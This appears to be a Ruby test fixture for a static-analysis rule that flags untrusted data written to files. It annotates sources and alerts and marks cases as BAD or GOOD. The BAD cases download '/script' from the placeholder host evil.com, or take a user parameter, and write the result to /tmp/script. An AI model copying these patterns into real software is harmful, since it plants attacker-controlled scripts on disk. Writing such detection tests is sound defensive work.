require "net/http"

resp = Net::HTTP.new("evil.com").get("/script").body # $ Source
file = File.open("/tmp/script", "w")
file.write(resp) # $ Alert // BAD

class ExampleController < ActionController::Base
    def example
      script = params[:script] # $ Source
      file = File.open("/tmp/script", "w")
      file.write(script) # $ Alert // BAD
    end

    def example2
      a = "a"
      file = File.open("/tmp/script", "w")
      file.write(a) # GOOD
    end
end
